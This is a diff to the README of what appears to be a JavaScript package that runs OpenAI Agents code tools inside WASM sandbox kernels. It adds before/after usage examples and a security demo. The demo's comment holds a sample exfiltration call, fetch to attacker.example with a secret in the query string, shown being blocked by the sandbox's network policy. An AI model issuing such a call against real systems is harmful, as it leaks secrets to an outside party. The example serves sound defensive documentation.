@@ -25,6 +25,39 @@ The wasmagent kernels live below the OS line — QuickJS-in-WASM, Pyodide-in-WAS
 or Wasmtime — so they run wherever JS runs. This package binds them to the
 Agents JS `Tool` shape.
 
+## Before / After
+
+Replacing the OpenAI built-in `code_interpreter` tool with a wasmagent WASM kernel:
+
+```diff
+ const agent = new Agent({
+   name: "math-helper",
+   tools: [
+-    { type: "code_interpreter" },   // ← hosted, no edge support, per-session billing
++    sandboxedJsAgentTool({ kernel: new QuickJSKernel() }),
++    // ↑ in-process, edge-safe, $0/call, full CapabilityManifest
+   ],
+ });
+```
+
+Full before/after:
+
+```diff
++import { sandboxedJsAgentTool } from "@wasmagent/openai-agents";
++import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
+
+ const agent = new Agent({
+   name: "math-helper",
+   tools: [
+-    { type: "code_interpreter" },
++    sandboxedJsAgentTool({
++      kernel: new QuickJSKernel(),
++      capabilities: { allowedHosts: [] },
++    }),
+   ],
+ });
+```
+
 ## Install
 
 ```bash
@@ -83,6 +116,33 @@ one line, the rest of your code is unchanged:
 | `RemoteSandboxKernel` (`/kernel-remote`) | Need full POSIX, native binaries, multi-tenant trust. Backed by E2B / Cloudflare Sandbox. | n/a |
 
 Swap is a one-liner — `kernel: new QuickJSKernel()` becomes `kernel: new PyodideKernel()`. Same `CapabilityManifest`, same OpenAI Agents JS `Tool<T>` shape.
+
+## Security demo
+
+`CapabilityManifest` enforces network and filesystem policy at the kernel
+boundary — the model cannot escape it regardless of what code it generates:
+
+```ts
+import { sandboxedJsAgentTool } from "@wasmagent/openai-agents";
+import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
+
+const kernel = new QuickJSKernel();
+const tool = sandboxedJsAgentTool({
+  kernel,
+  capabilities: {
+    allowedHosts: [],           // no outbound network
+    allowedPaths: [],           // no filesystem access
+    cpuMs: 5_000,
+    memoryLimitBytes: 64 * 1024 * 1024,
+  },
+});
+
+// Model-generated code that tries to exfiltrate data:
+// fetch("https://attacker.example/exfil?data=secret")
+// → throws: network access denied — host "attacker.example" not in allowedHosts
+```
+
+The same manifest applies to both `sandboxedJsAgentTool` and `codeModeAgentTool`.
 
 ## Capability manifest
 
